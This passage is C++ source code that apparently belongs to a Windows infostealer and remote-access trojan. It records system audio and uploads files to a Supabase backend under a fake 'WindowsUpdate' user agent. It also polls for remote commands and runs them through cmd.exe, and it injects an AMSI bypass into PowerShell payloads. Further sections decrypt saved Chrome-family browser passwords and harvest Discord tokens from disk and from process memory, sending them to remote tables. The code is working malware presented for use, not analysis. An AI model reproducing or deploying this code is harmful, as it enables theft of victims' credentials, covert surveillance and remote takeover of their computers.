    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    bool result = false;
    IMMDeviceEnumerator* pEnum = NULL;
    IMMDevice* pDevice = NULL;
    IAudioClient* pClient = NULL;
    IAudioCaptureClient* pCapture = NULL;
    do {
        if (FAILED(CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnum))) break;
        if (FAILED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice))) break;
        if (FAILED(pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pClient))) break;
        WAVEFORMATEX* pMixFormat = NULL;
        if (FAILED(pClient->GetMixFormat(&pMixFormat))) break;
        REFERENCE_TIME bufDuration = 10000000;
        if (FAILED(pClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, bufDuration, 0, pMixFormat, NULL))) { CoTaskMemFree(pMixFormat); break; }
        if (FAILED(pClient->GetService(IID_IAudioCaptureClient, (void**)&pCapture))) { CoTaskMemFree(pMixFormat); break; }
        UINT32 bytesPerFrame = pMixFormat->nBlockAlign;
        UINT32 estimatedBytes = pMixFormat->nSamplesPerSec * bytesPerFrame * 10;
        std::vector<BYTE> audioBuffer;
        audioBuffer.reserve(estimatedBytes + 44);
        struct WAVHDR { char id[4]; uint32_t sz; char wave[4]; char fId[4]; uint32_t fsz; uint16_t tag; uint16_t ch; uint32_t sr; uint32_t br; uint16_t ba; uint16_t bps; char dId[4]; uint32_t dsz; } hdr;
        memcpy(hdr.id, "RIFF", 4); memcpy(hdr.wave, "WAVE", 4); memcpy(hdr.fId, "fmt ", 4); memcpy(hdr.dId, "data", 4);
        hdr.fsz = 16; hdr.tag = pMixFormat->wFormatTag; hdr.ch = pMixFormat->nChannels;
        hdr.sr = pMixFormat->nSamplesPerSec; hdr.br = pMixFormat->nAvgBytesPerSec;
        hdr.ba = pMixFormat->nBlockAlign; hdr.bps = pMixFormat->wBitsPerSample;
        hdr.dsz = 0; hdr.sz = 0;
        audioBuffer.insert(audioBuffer.end(), (BYTE*)&hdr, (BYTE*)&hdr + sizeof(hdr));
        if (FAILED(pClient->Start())) { CoTaskMemFree(pMixFormat); break; }
        DWORD startTime = GetTickCount();
        while (GetTickCount() - startTime < 10000) {
            UINT32 packets = 0;
            while (SUCCEEDED(pCapture->GetNextPacketSize(&packets)) && packets > 0) {
                BYTE* pData = NULL; UINT32 frames = 0; DWORD flags = 0;
                if (FAILED(pCapture->GetBuffer(&pData, &frames, &flags, NULL, NULL))) break;
                if (frames > 0 && !(flags & AUDCLNT_BUFFERFLAGS_SILENT))
                    audioBuffer.insert(audioBuffer.end(), pData, pData + frames * bytesPerFrame);
                else if (frames > 0)
                    audioBuffer.insert(audioBuffer.end(), frames * bytesPerFrame, 0);
                pCapture->ReleaseBuffer(frames);
            }
            if (packets == 0) Sleep(15);
        }
        pClient->Stop();

        bool isFloat = (pMixFormat->wFormatTag == WAVE_FORMAT_IEEE_FLOAT);
        WORD savedChannels = pMixFormat->nChannels;
        DWORD savedSamplesPerSec = pMixFormat->nSamplesPerSec;
        CoTaskMemFree(pMixFormat);

        if (isFloat) {
            size_t dataOffset = sizeof(WAVHDR);
            size_t floatBytes = audioBuffer.size() - dataOffset;
            size_t numSamples = floatBytes / 4;
            size_t pcmBytes = numSamples * 2;
            std::vector<BYTE> pcm(dataOffset + pcmBytes);
            memcpy(pcm.data(), audioBuffer.data(), dataOffset);
            float* src = (float*)(audioBuffer.data() + dataOffset);
            int16_t* dst = (int16_t*)(pcm.data() + dataOffset);
            for (size_t i = 0; i < numSamples; i++) {
                float s = src[i];
                if (s < -1.0f) s = -1.0f;
                if (s > 1.0f) s = 1.0f;
                dst[i] = (int16_t)(s * 32767.0f);
            }
            audioBuffer.swap(pcm);
        }

        {
            size_t totalData = audioBuffer.size() - sizeof(hdr);
            WAVHDR* wh = (WAVHDR*)audioBuffer.data();
            if (isFloat) {
                wh->tag = WAVE_FORMAT_PCM;
                wh->bps = 16;
                wh->ba = savedChannels * 2;
                wh->br = savedSamplesPerSec * wh->ba;
            }
            wh->dsz = (uint32_t)totalData;
            wh->sz = (uint32_t)(totalData + sizeof(hdr) - 8);
        }
        HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written = 0;
            WriteFile(hFile, audioBuffer.data(), (DWORD)audioBuffer.size(), &written, NULL);
            CloseHandle(hFile);
            result = written == audioBuffer.size();
        }
    } while (false);
    if (pCapture) pCapture->Release();
    if (pClient) pClient->Release();
    if (pDevice) pDevice->Release();
    if (pEnum) pEnum->Release();
    CoUninitialize();
    return result;
}

static std::string GetScreenshotTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y%m%d_%H%M%S", tm);
    return std::string(buf);
}

static bool UploadToStorage(const std::string& localPath, const std::string& storagePath, const char* contentType) {
    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return false; }
    char* buf = new char[size];
    DWORD read = 0;
    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) { delete[] buf; CloseHandle(hFile); return false; }
    CloseHandle(hFile);

    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { delete[] buf; return false; }
    WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); delete[] buf; return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"PUT", ToWide(storagePath).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); delete[] buf; return false; }

    std::wstring headers = L"apikey: " + g_supabaseServiceKey + L"\r\nAuthorization: Bearer " + g_supabaseServiceKey + L"\r\nContent-Type: " + ToWide(contentType) + L"\r\nx-upsert: true";

    bool ok = false;
    if (WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), buf, size, size, 0)) {
        if (WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD sc = 0, sl = sizeof(sc);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &sc, &sl, NULL);
            ok = (sc >= 200 && sc < 300);
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    delete[] buf;
    return ok;
}

static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = NULL) {
    std::string result;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdOutRd, hStdOutWr;
    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0)) { if (outExitCode) *outExitCode = -1; return ""; }
    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdOutWr;
    si.hStdError = hStdOutWr;
    std::string cmdLine = "cmd.exe /c " + cmd;
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    if (!CreateProcessA(NULL, &cmdLine[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, sysDir, &si, &pi)) {
        CloseHandle(hStdOutWr); CloseHandle(hStdOutRd);
        if (outExitCode) *outExitCode = -1;
        return "";
    }
    CloseHandle(hStdOutWr);
    DWORD startTime = GetTickCount();
    char buf[4096];
    while (true) {
        DWORD avail = 0;
        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
        if (avail > 0) {
            DWORD read = 0;
            DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
            if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
                buf[read] = 0;
                result += buf;
                if (result.size() > 32000) { result = result.substr(0, 32000); result += "...[truncated]"; break; }
            }
        }
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 200);
        if (waitResult == WAIT_OBJECT_0) break;
        if (waitResult == WAIT_TIMEOUT && GetTickCount() - startTime > 60000) {
            TerminateProcess(pi.hProcess, 1);
            result += "\n[timed out after 60s]";
            break;
        }
    }
    while (true) {
        DWORD avail = 0;
        PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &avail, NULL);
        if (avail == 0) break;
        DWORD read = 0;
        DWORD toRead = avail < (DWORD)sizeof(buf)-1 ? avail : (DWORD)sizeof(buf)-1;
        if (ReadFile(hStdOutRd, buf, toRead, &read, NULL) && read > 0) {
            buf[read] = 0;
            result += buf;
            if (result.size() > 32000) break;
        }
    }
    CloseHandle(hStdOutRd);
    DWORD exitCode = -1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    if (outExitCode) *outExitCode = exitCode;
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return result;
}

static std::string Base64Decode(const std::string& s) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) return "";
    std::string result(len, 0);
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.size(), CRYPT_STRING_BASE64, (BYTE*)&result[0], &len, NULL, NULL)) return "";
    result.resize(len);
    return result;
}

static void CheckAndHandleExec() {
    std::wstring q = SUPABASE_CONTROL_PATH;
    q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
    std::string resp;
    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
    if (resp.size() < 10) return;
    std::string rowId = ExtractJSONNumber(resp, "id");
    std::string payload = ExtractJSONString(resp, "payload");
    if (rowId.empty() || payload.empty()) return;

    // AMSI bypass for PowerShell commands
    if (payload.find("powershell") != std::string::npos || payload.find("pwsh") != std::string::npos) {
        std::string bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
        if (payload.find("-EncodedCommand") != std::string::npos || payload.find("-Enc") != std::string::npos) {
            size_t encPos = payload.find("-EncodedCommand");
            if (encPos == std::string::npos) encPos = payload.find("-Enc ");
            if (encPos == std::string::npos) encPos = payload.find("-Enc\"");
            if (encPos == std::string::npos) encPos = payload.find("-Enc=");
            size_t skip = (payload.substr(encPos, 16) == "-EncodedCommand") ? 16 : 4;
            size_t argStart = payload.find_first_not_of(" \t", encPos + skip);
            if (argStart != std::string::npos) {
                size_t argEnd = std::string::npos;
                size_t quoteOffset = 0;
                if (payload[argStart] == '"') { quoteOffset = argStart + 1; argEnd = payload.find('"', quoteOffset); }
                else { argEnd = payload.find_first_of(" \t", argStart); if (argEnd == std::string::npos) argEnd = payload.size(); quoteOffset = argStart; }
                if (argEnd != std::string::npos) {
                    std::string encoded = payload.substr(quoteOffset, argEnd - quoteOffset);
                    std::string decoded = Base64Decode(encoded);
                    if (!decoded.empty() && decoded.size() >= 2) {
                        // Reinterpret as UTF-16LE and prepend bypass
                        std::wstring originalCmd((wchar_t*)decoded.data(), decoded.size() / 2);
                        originalCmd.erase(std::find(originalCmd.begin(), originalCmd.end(), L'\0'), originalCmd.end());
                        std::wstring wbypass = ToWide(bypass);
                        std::wstring combined = wbypass + originalCmd;
                        std::string reEncoded = Base64Encode((BYTE*)combined.data(), (DWORD)combined.size() * 2);
                        payload = payload.substr(0, quoteOffset) + reEncoded + payload.substr(argEnd);
                    }
                }
            }
        } else {
            size_t cPos = payload.find("-c \"");
            if (cPos == std::string::npos) cPos = payload.find("-Command \"");
            if (cPos != std::string::npos) {
                cPos = payload.find('"', cPos + 2);
                if (cPos != std::string::npos) payload.insert(cPos + 1, bypass);
            }
        }
    }

    DWORD exitCode = 0;
    std::string output = ExecuteCommand(payload, &exitCode);
    if (output.empty()) output = "(no output)";
    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"" + EscapeJSON(payload) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
    json = "{\"executed\":true}";
    std::wstring patchPath = SUPABASE_CONTROL_PATH;
    patchPath += L"?id=eq." + ToWide(rowId);
    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
    LogMsg("Exec: " + payload + " -> exit " + std::to_string((int)exitCode));
}
 
// === Browser password harvester ===
 
#define SUPABASE_PASSWORDS_PATH L"/rest/v1/passwords"
#define SUPABASE_COOKIES_PATH L"/rest/v1/cookies"
#define SUPABASE_WIFI_PATH L"/rest/v1/wifi_creds"
#define SUPABASE_DISCORD_PATH L"/rest/v1/discord_tokens"
#define SUPABASE_WHATSAPP_PATH L"/rest/v1/whatsapp_tokens"
 
static uint32_t SqliteVarint(const uint8_t* p, int* used) {
    uint32_t v = 0; *used = 0;
    for (int i = 0; i < 9; i++) {
        v = (v << 7) | (p[i] & 0x7F); (*used)++;
        if (!(p[i] & 0x80)) return v;
    }
    return v;
}
 
static uint16_t SqliteU16(const uint8_t* p) { return (uint16_t)(p[0] << 8) | p[1]; }
static uint32_t SqliteU32(const uint8_t* p) { return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3]; }
 
static const uint8_t* SqliteColumn(const uint8_t* payload, int payloadLen, int colIndex, int* outSize) {
    int used; uint32_t hdrSize = SqliteVarint(payload, &used);
    if (hdrSize > (uint32_t)payloadLen) return NULL;
    int pos = used, dataOff = (int)hdrSize;
    for (int i = 0; i <= colIndex; i++) {
        if ((uint32_t)pos >= hdrSize) return NULL;
        uint32_t st = SqliteVarint(payload + pos, &used); pos += used;
        int sz = 0;
        if (st == 1) sz = 1; else if (st == 2) sz = 2; else if (st == 3) sz = 3;
        else if (st == 4) sz = 4; else if (st == 5) sz = 6; else if (st == 6 || st == 7) sz = 8;
        else if (st >= 12 && st % 2 == 0) sz = (st - 12) / 2;
        else if (st >= 13) sz = (st - 13) / 2;
        if (i == colIndex) { if (st == 0 || st == 8 || st == 9 || sz == 0) { *outSize = 0; return NULL; } *outSize = sz; return payload + dataOff; }
        dataOff += sz;
    }
    return NULL;
}
 
static bool SqliteWalk(const uint8_t* db, size_t dbSize, uint16_t pageSize, int pageNum,
    bool (*cb)(int64_t rowid, const uint8_t* payload, int payloadLen, void* user), void* user)
{
    if ((size_t)((pageNum - 1) * pageSize + 8) > dbSize) return false;
    const uint8_t* page = db + (pageNum - 1) * pageSize;
    int type = page[0];
    if (type != 0x05 && type != 0x0D) return false;
    uint16_t count = SqliteU16(page + 3);
    if (type == 0x05) {
        for (uint16_t i = 0; i < count; i++) {
            uint16_t ptr = SqliteU16(page + pageSize - (i + 1) * 2);
            if (ptr + 4 > pageSize) continue;
            if (!SqliteWalk(db, dbSize, pageSize, (int)SqliteU32(page + ptr), cb, user)) return false;
        }
        return SqliteWalk(db, dbSize, pageSize, (int)SqliteU32(page + 8), cb, user);
    }
    for (uint16_t i = 0; i < count; i++) {
        uint16_t ptr = SqliteU16(page + pageSize - (i + 1) * 2);
        if (ptr + 2 > pageSize) continue;
        int used; SqliteVarint(page + ptr, &used);
        int ridUsed; uint64_t rowid = SqliteVarint(page + ptr + used, &ridUsed); used += ridUsed;
        if (used + 4 > pageSize - ptr) continue;
        if (!cb((int64_t)rowid, page + ptr + used, (int)(pageSize - ptr - used), user)) return false;
    }
    return true;
}
 
static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSize, const char* name) {
    struct Ctx { const char* name; int root; };
    Ctx ctx = { name, 0 };
    SqliteWalk(db, dbSize, pageSize, 1,
        [](int64_t, const uint8_t* p, int pl, void* u) -> bool {
            auto* c = (Ctx*)u; int tLen, nLen;
            const uint8_t* typ = SqliteColumn(p, pl, 0, &tLen);
            if (!typ || (int)strlen("table") != tLen || memcmp(typ, "table", tLen) != 0) return true;
            const uint8_t* tn = SqliteColumn(p, pl, 2, &nLen);
            if (tn && nLen > 0 && (int)strlen(c->name) == nLen && memcmp(tn, c->name, nLen) == 0) {
                int rLen; const uint8_t* rp = SqliteColumn(p, pl, 3, &rLen);
                if (rp && rLen > 0 && rLen <= 4) for (int b = 0; b < rLen; b++) c->root = (c->root << 8) | rp[b];
                return false;
            }
            return true;
        }, &ctx);
    return ctx.root;
}
 
static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t* blob, int blobLen, const char* browser, const std::string& originUrl, std::string& out) {
    if (blobLen < 15 || blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) { LogMsg(std::string(browser) + ": unsupported prefix '" + std::string((const char*)blob, blobLen > 3 ? 3 : blobLen) + "'"); return false; }
    const uint8_t* nonce = blob + 3;
    const uint8_t* ct = blob + 15;
    int ctLen = blobLen - 15 - 16;
    if (ctLen <= 0) return false;
    const uint8_t* tag = ct + ctLen;
 
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; bool ok = false;
    ULONG ol = 0; DWORD tv = 16;
    if (FAILED(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return false;
    if (FAILED(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)L"ChainingModeGCM", (ULONG)(sizeof(L"ChainingModeGCM")), 0))) goto done;
    BCryptSetProperty(hAlg, BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&tv, sizeof(tv), 0);
    if (FAILED(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0))) goto done;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = (PUCHAR)nonce; ai.cbNonce = 12; ai.pbTag = (PUCHAR)tag; ai.cbTag = 16;

    out.resize(ctLen + 32);
    if (SUCCEEDED(BCryptDecrypt(hKey, (PUCHAR)ct, ctLen, &ai, NULL, 0, (PUCHAR)out.data(), (ULONG)out.size(), &ol, 0))) {
        out.resize(ol);
        // Chrome 130+ (DB version 24+) prepends SHA256(origin_url) before encryption — strip it
        if (ol >= 32 && !originUrl.empty()) {
            BCRYPT_ALG_HANDLE hHash = NULL;
            BCRYPT_HASH_HANDLE hHashObj = NULL;
            DWORD hashLen = 0, tmp = 0;
            uint8_t expectedHash[32];
            if (SUCCEEDED(BCryptOpenAlgorithmProvider(&hHash, BCRYPT_SHA256_ALGORITHM, NULL, 0)) &&
                SUCCEEDED(BCryptGetProperty(hHash, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen, sizeof(hashLen), &tmp, 0)) &&
                hashLen == 32 &&
                SUCCEEDED(BCryptCreateHash(hHash, &hHashObj, NULL, 0, NULL, 0, 0)) &&
                SUCCEEDED(BCryptHashData(hHashObj, (PUCHAR)originUrl.c_str(), (ULONG)originUrl.size(), 0)) &&
                SUCCEEDED(BCryptFinishHash(hHashObj, expectedHash, 32, 0)) &&
                memcmp(out.data(), expectedHash, 32) == 0) {
                out.erase(0, 32);
                LogMsg(std::string(browser) + ": stripped SHA256 hash prefix");
            }
            if (hHashObj) BCryptDestroyHash(hHashObj);
            if (hHash) BCryptCloseAlgorithmProvider(hHash, 0);
        }
        ok = true;
    }
done:
    if (hKey) BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}
 
static const struct { const char* name; const char* ls; const char* ld; } kChromeBrowsers[] = {
    {"Chrome",  "\\Google\\Chrome\\User Data\\Local State",  "\\Google\\Chrome\\User Data\\Default\\Login Data"},
    {"Edge",    "\\Microsoft\\Edge\\User Data\\Local State",  "\\Microsoft\\Edge\\User Data\\Default\\Login Data"},
    {"Brave",   "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"},
    {"Opera",   "\\Opera Software\\Opera Stable\\Local State", "\\Opera Software\\Opera Stable\\Login Data"},
    {"Vivaldi", "\\Vivaldi\\User Data\\Local State",           "\\Vivaldi\\User Data\\Default\\Login Data"},
    {NULL, NULL, NULL}
};
 
static bool IsTokenChar(char c) {
    return isalnum((unsigned char)c) || c == '_' || c == '-' || c == '.';
}

static void HarvestDiscordTokens() {
    const char* variantPaths[] = {
        "\\discord\\Local Storage\\leveldb",
        "\\discordptb\\Local Storage\\leveldb",
        "\\discordcanary\\Local Storage\\leveldb",
        NULL
    };
    char appData[MAX_PATH];
    DWORD adLen = GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
    if (adLen == 0 || adLen >= MAX_PATH) return;
    std::string ad(appData);
    char localAppData[MAX_PATH];
    DWORD lalLen = GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    std::string lad = (lalLen > 0 && lalLen < MAX_PATH) ? std::string(localAppData) : "";

    std::vector<std::string> tokens;
    int totalFilesScanned = 0;
    int totalCandidates = 0;
    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);

    for (int baseTry = 0; baseTry < 2; baseTry++) {
        std::string basePath = (baseTry == 0) ? ad : lad;
        if (basePath.empty()) continue;
        for (int v = 0; variantPaths[v]; v++) {
        std::string leveldbPath = basePath + variantPaths[v];
        std::string searchPath = leveldbPath + "\\*";
        int variantFiles = 0;
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
        if (hFind == INVALID_HANDLE_VALUE) { LogMsg(std::string("Discord: ") + variantPaths[v] + " not found"); continue; }
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            std::string fn(fd.cFileName);
            if (fn.size() < 4) continue;
            std::string ext = fn.substr(fn.size() - 4);
            if (ext != ".ldb" && ext != ".log") continue;
            if (fd.nFileSizeHigh > 0 || fd.nFileSizeLow > 10485760) continue;

            variantFiles++;
            std::string fpath = leveldbPath + "\\" + fn;
            HANDLE hFile = CreateFileA(fpath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile == INVALID_HANDLE_VALUE) continue;
            DWORD sz = GetFileSize(hFile, NULL);
            if (sz == 0 || sz == INVALID_FILE_SIZE) { CloseHandle(hFile); continue; }
            char* buf = new char[sz + 1];
            DWORD rd = 0;
            if (ReadFile(hFile, buf, sz, &rd, NULL) && rd == sz) {
                buf[sz] = 0;
                for (DWORD i = 0; i < sz; i++) {
                    if (!IsTokenChar(buf[i])) continue;
                    // MFA token: starts with "mfa."
                    if (i + 4 <= sz && buf[i] == 'm' && buf[i+1] == 'f' && buf[i+2] == 'a' && buf[i+3] == '.') {
                        DWORD j = i + 4; while (j < sz && IsTokenChar(buf[j]) && j - i < 120) j++;
                        if (j - i >= 70 && j - i <= 120) { totalCandidates++; tokens.push_back(std::string(buf + i, j - i)); }
                        i = j; continue;
                    }
                    // Standard token: find 2 dots with segment lengths matching discord format
                    DWORD dots = 0, dp[2] = {0}, end = i;
                    while (end < sz && IsTokenChar(buf[end]) && end - i < 130) {
                        if (buf[end] == '.') { if (dots < 2) dp[dots++] = end; else break; }
                        end++;
                    }
                    if (dots == 2) {
                        DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
                        DWORD end3 = dp[1] + 1;
                        while (end3 < sz && buf[end3] != '.' && IsTokenChar(buf[end3]) && end3 - i < 130) end3++;
                        DWORD seg3 = end3 - dp[1] - 1;
                        if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
                            bool v = true;
                            for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                            for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                            bool d = false;
                            for (int k = i; k < dp[0]; k++) if (buf[k] >= '0' && buf[k] <= '9') { d = true; break; }
                            if (v && d) { totalCandidates++; tokens.push_back(std::string(buf + i, end3 - i)); }
                        }
                    }
                    // Skip past this run of token chars
                    while (i < sz && IsTokenChar(buf[i])) i++;
                }
            }
            delete[] buf;
            CloseHandle(hFile);
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
        totalFilesScanned += variantFiles;
        LogMsg(std::string("Discord: scanned ") + std::to_string(variantFiles) + " files in " + variantPaths[v]);
        } // inner v loop
    } // outer baseTry loop

    LogMsg(std::string("Discord: ") + std::to_string(totalFilesScanned) + " total files, " + std::to_string(totalCandidates) + " candidates, " + std::to_string(tokens.size()) + " valid tokens");

    if (!tokens.empty()) {
        std::sort(tokens.begin(), tokens.end());
        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
        std::string batch = "[";
        for (size_t i = 0; i < tokens.size(); i++) {
            if (i > 0) batch += ",";
            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
        }
        batch += "]";
        std::string pr;
        HttpRequest(L"POST", SUPABASE_DISCORD_PATH, batch, pr);
        return;
    }

    // Fallback: scan Discord process memory for the token (it's in V8 heap)
    LogMsg("Discord: scanning process memory");
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (lstrcmpiW(pe.szExeFile, L"discord.exe") == 0) {
                    size_t before = tokens.size();
                    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                    if (!hp) continue;
                    SYSTEM_INFO si; GetSystemInfo(&si);
                    uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
                    while (addr < (uintptr_t)si.lpMaximumApplicationAddress) {
                        MEMORY_BASIC_INFORMATION mbi;
                        if (VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 65536; continue; }
                        if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) && !(mbi.Protect & PAGE_GUARD) && mbi.Type == MEM_PRIVATE && mbi.RegionSize <= 104857600) {
                            char* buf = new char[(size_t)mbi.RegionSize + 1];
                            SIZE_T rd = 0;
                            if (ReadProcessMemory(hp, mbi.BaseAddress, buf, mbi.RegionSize, &rd) && rd > 0) {
                                buf[rd] = 0;
                                for (DWORD i = 0; i < (DWORD)rd; i++) {
                                    if (!IsTokenChar(buf[i])) continue;
                                    if (i + 4 <= rd && buf[i] == 'm' && buf[i+1] == 'f' && buf[i+2] == 'a' && buf[i+3] == '.') {
                                        DWORD j = i + 4; while (j < rd && IsTokenChar(buf[j]) && j - i < 120) j++;
                                        if (j - i >= 70 && j - i <= 120) tokens.push_back(std::string(buf + i, j - i));
                                        i = j; continue;
                                    }
                                    DWORD dots = 0, dp[2] = {0}, end = i;
                                    while (end < rd && IsTokenChar(buf[end]) && end - i < 130) {
                                        if (buf[end] == '.') { if (dots < 2) dp[dots++] = end; else break; }
                                        end++;
                                    }
                                    if (dots == 2) {
                                        DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
                                        DWORD end3 = dp[1] + 1;
                                        while (end3 < rd && buf[end3] != '.' && IsTokenChar(buf[end3]) && end3 - i < 130) end3++;
                                        DWORD seg3 = end3 - dp[1] - 1;
                                        if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
                                            bool v = true;
                                            for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                                            for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
                                            bool d = false;
                                            for (int k = i; k < dp[0]; k++) if (buf[k] >= '0' && buf[k] <= '9') { d = true; break; }
                                            if (v && d) tokens.push_back(std::string(buf + i, end3 - i));
                                        }
                                    }
                                    while (i < rd && IsTokenChar(buf[i])) i++;
                                }
                            }
                            delete[] buf;
                            if (tokens.size() > before) { LogMsg("Discord mem: found in PID " + std::to_string(pe.th32ProcessID)); break; }
                        }
                        addr += mbi.RegionSize;
                    }
                    CloseHandle(hp);
                    if (tokens.size() > before) break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (!tokens.empty()) {
        std::sort(tokens.begin(), tokens.end());
        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
        std::string batch = "[";
        for (size_t i = 0; i < tokens.size(); i++) {
            if (i > 0) batch += ",";
            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
        }
        batch += "]";
        std::string pr;
        HttpRequest(L"POST", SUPABASE_DISCORD_PATH, batch, pr);
